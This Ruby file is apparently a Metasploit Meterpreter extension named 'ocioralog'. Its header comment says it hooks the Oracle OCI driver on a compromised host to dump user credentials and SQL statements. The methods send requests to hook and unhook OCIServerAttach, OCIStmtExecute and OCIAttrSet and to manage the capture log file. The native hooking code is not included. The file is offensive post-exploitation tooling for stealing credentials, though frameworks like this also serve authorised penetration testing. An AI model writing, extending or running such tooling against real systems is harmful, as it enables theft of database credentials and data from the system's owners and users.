#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/post/meterpreter/extensions/ocioralog/tlv'

module Rex
module Post
module Meterpreter
module Extensions
module Ocioralog

###
#
# This meterpreter extensions hooks into the OCI driver to 
# redirect critical Oracle functions in order to dump the
# user credentials and the SQL statements
#
###
class Ocioralog < Extension


	def initialize(client)
		super(client, 'ocioralog')

		client.register_extension_aliases(
			[
				{
					'name' => 'ocioralog',
					'ext'  => self
				},
			])
	end
	
	def ocioralog_hook()
		request = Packet.create_request('ocioralog_hook')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_HOOK)
		}
	end

	def ocioralog_unhook()
		request = Packet.create_request('ocioralog_unhook')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_UNHOOK)
		}
	end

	def ocioralog_getlogfile()
		request = Packet.create_request('ocioralog_getlogfile')
		response = client.send_request(request)
		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_GETLOGFILE)
		} 
	end


	def ocioralog_setlogfile(filename)
		request = Packet.create_request('ocioralog_setlogfile')
		request.add_tlv(TLV_TYPE_OCIORALOG_SETLOGFILE, filename)
		response = client.send_request(request)
		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_SETLOGFILE)
		} 
	end

	def ocioralog_hookociserverattach()
		request = Packet.create_request('ocioralog_hookOCIServerAttach')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_HOOKOCISERVERATTACH)
		}
	end

	def ocioralog_hookocistmtexecute()
		request = Packet.create_request('ocioralog_hookOCIStmtExecute')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_HOOKOCISTMTEXECUTE)
		}
	end	

	def ocioralog_hookociattrset()
		request = Packet.create_request('ocioralog_hookOCIAttrSet')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_HOOKOCIATTRSET)
		}
	end

	def ocioralog_unhookociserverattach()
		request = Packet.create_request('ocioralog_unhookOCIServerAttach')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_UNHOOKOCISERVERATTACH)
		}
	end

	def ocioralog_unhookocistmtexecute()
		request = Packet.create_request('ocioralog_unhookOCIStmtExecute')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_UNHOOKOCISTMTEXECUTE)
		}
	end	

	def ocioralog_unhookociattrset()
		request = Packet.create_request('ocioralog_unhookOCIAttrSet')

		response = client.send_request(request)

		return {
			'response' => response.get_tlv_value(TLV_TYPE_OCIORALOG_UNHOOKOCIATTRSET)
		}
	end

end

end; end; end; end; end
